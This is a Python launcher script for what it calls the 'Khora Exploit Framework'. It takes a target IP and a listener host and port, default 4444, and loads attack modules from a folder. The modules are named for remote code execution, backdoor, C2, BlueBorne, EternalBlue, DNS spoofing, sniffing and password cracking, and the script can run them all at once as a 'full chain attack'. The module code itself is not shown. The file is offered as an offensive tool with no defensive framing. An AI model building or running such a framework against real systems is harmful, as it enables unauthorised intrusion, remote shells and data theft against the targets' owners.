import sys
import importlib.util
import argparse
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

MODULE_DIR = Path("modules")

def load_module(filename):
    spec = importlib.util.spec_from_file_location(filename.replace('.py',''), MODULE_DIR / filename)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

def execute_module(module_name, target, lhost, lport=4444):
    try:
        mod = load_module(f"{module_name}_module.py")
        if hasattr(mod, 'run_' + module_name):
            func = getattr(mod, f'run_{module_name}')
            func(target, lhost, lport)
        else:
            print(f"[!] Module {module_name} missing run_{module_name} function")
    except Exception as e:
        print(f"[!] Module {module_name} failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Khora Exploit Framework")
    parser.add_argument("target", help="Target IP")
    parser.add_argument("lhost", help="LHOST")
    parser.add_argument("-m", "--module", help="Single module")
    parser.add_argument("-p", "--port", type=int, default=4444)
    
    args = parser.parse_args()
    
    modules = [
        'nmap', 'rce', 'backdoor', 'blueborne', 'cracker',
        'jailbreak', 'c2', 'dns_spoof', 'sniffer', 'eternalblue'
    ]
    
    if args.module:
        print(f"[+] Running single module: {args.module}")
        execute_module(args.module, args.target, args.lhost, args.port)
    else:
        print("[+] Running full chain attack...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(execute_module, mod, args.target, args.lhost, args.port) 
                      for mod in modules]
            for future in futures:
                future.result()

if __name__ == "__main__":
    main()